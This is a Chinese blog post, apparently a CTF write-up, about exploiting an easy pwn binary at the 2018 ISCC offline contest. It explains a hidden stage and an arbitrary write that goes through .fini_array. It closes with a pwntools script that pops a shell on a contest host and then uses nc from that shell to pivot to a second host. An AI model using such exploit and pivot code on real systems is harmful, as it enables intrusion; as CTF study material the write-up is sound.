@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="这个月和两名队友一起去北京打了平生第一次线下赛，比赛结束就开始水到现在了，决定写个WP之后继续好好学习吧。然后其实虽然成绩尚可，不过我只是做了一个并不怎么难的Pwn而已，高地的Pwn还没怎么看过（因为不懂规则还缺乏经验所以只能手动打私地，没时间继续看题了。。。）准备明天就开始做高地题，做得出来的话会更新在下面。">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Aris">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="iscc线下pwn WriteUP"/>
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="Aris&#39;Blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>iscc线下pwn WriteUP - Aris&#39;Blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/links">
+                    links
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2018/07/26/iscc线下低地pwn WriteUp/">
+                iscc线下pwn WriteUP
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-07-26</span>
+            
+            
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p>这个月和两名队友一起去北京打了平生第一次线下赛，比赛结束就开始水到现在了，决定写个WP之后继续好好学习吧。然后其实虽然成绩尚可，不过我只是做了一个并不怎么难的Pwn而已，高地的Pwn还没怎么看过（因为不懂规则还缺乏经验所以只能手动打私地，没时间继续看题了。。。）准备明天就开始做高地题，做得出来的话会更新在下面。<br><a id="more"></a></p>
+<h2 id="私地Pwn"><a href="#私地Pwn" class="headerlink" title="私地Pwn"></a>私地Pwn</h2><p>前面的四个小关很简单，第一关就是个一元方程，第二关就是个有规律的数列，第三关就是map一下，第四关就是一个多元方程。</p>
+<p>通过之后发现  system(“cat flag.txt”);  并不能真的拿到flag（我当时还以为我做完了，后来仔细想想线下肯定是要拿shell的啊！</p>
+<p>回过头看verify_working()里有个secret_phase()(隐藏关卡)，进入条件是最后输入的值不在keys的表中，这个不难，我只要在第三关答案的末尾加上’z’之后的字符比如’{‘就可以了，进入隐藏关的同时我还发现这题其实还是有不少东西我没有用到，比如很可疑的<strong>pp、</strong>gg还有__nr函数。</p>
+<p>隐藏关里看似只是让你给第四关里的结构体改个名，然而在<strong>gg里可以发现，就在改名区存在任意地址执行，而</strong>nr里有任意地址写，满足拿shell的条件，就在我当时还想着怎么达到<strong>gg函数的时候，交叉引用发现在.fini_array里写着</strong>gg的地址，调试了一下发现，果然和我猜的一样是在程序结束的时候执行的(这里虽然缺乏姿势不过还算好猜</p>
+<p>之后就是简单的构造和疯狂的打分了，最后颁奖仪式上官方定位这题为易，是私地高地一共6题中最简单的了，后来想想的确是这样，不过多亏了这题，我们队大部分的分都是靠这题打的23333</p>
+<p>最后附上Payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line">from pwn import *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">def z(a=<span class="string">''</span>):</span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cn = remote(<span class="string">'192.168.31.82'</span>,8000)</span><br><span class="line"><span class="comment">#cn = process('./wTEdNnGnqZHQigN8.Pwn02')</span></span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">'8584'</span>)</span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">'[1, 1, 3, 5, 11, 21]'</span>)</span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">'mappingstringsforfunandprofit&#123;'</span>)</span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">'0 0 1 0 0 3 1 a'</span>)</span><br><span class="line"></span><br><span class="line">sys = 0x080485A0</span><br><span class="line"><span class="comment">#z('set follow-fork-mode parent\nb*0x080487F7\nc')</span></span><br><span class="line"></span><br><span class="line">buf = <span class="string">'aaaa'</span> + p32(0x08048CDA)</span><br><span class="line">cn.sendline(buf)</span><br><span class="line"></span><br><span class="line">buf = <span class="string">'bbbb'</span> + p32(sys)</span><br><span class="line">cn.sendline(buf)</span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">''</span>)</span><br><span class="line">cn.sendline(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">buf = <span class="string">'a'</span> * 0xfc + p32(0x0804B070)</span><br><span class="line">cn.sendline(buf)</span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line">sleep(1)</span><br><span class="line"><span class="built_in">print</span> <span class="string">'step1...ok!'</span></span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">'nc 192.168.35.80 8000'</span>)</span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">'8584'</span>)</span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">'[1, 1, 3, 5, 11, 21]'</span>)</span><br><span class="line">cn.sendline(<span class="string">'mappingstringsforfunandprofit&#123;'</span>)</span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">'0 0 1 0 0 3 1 a'</span>)</span><br><span class="line"></span><br><span class="line">sys = 0x080485A0</span><br><span class="line"><span class="comment">#z('set follow-fork-mode parent\nb*0x080487F7\nc')</span></span><br><span class="line"></span><br><span class="line">buf = <span class="string">'aaaa'</span> + p32(0x08048CDA)</span><br><span class="line">cn.sendline(buf)</span><br><span class="line"></span><br><span class="line">buf = <span class="string">'bbbb'</span> + p32(sys)</span><br><span class="line">cn.sendline(buf)</span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">''</span>)</span><br><span class="line">cn.sendline(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">buf = <span class="string">'a'</span> * 0xfc + p32(0x0804B070)</span><br><span class="line">cn.sendline(buf)</span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2018/07/26/iscc线下低地pwn WriteUp/">iscc线下pwn WriteUP</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2018/06/03/suctf/">suctf的两道pwn——Heap和Note</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2018/03/30/强网杯部分pwn复现/">强网杯部分pwn复现</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2018/03/27/hello-world/">Hello World</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/ArisXu">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    Copyright © 2018 Airs | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
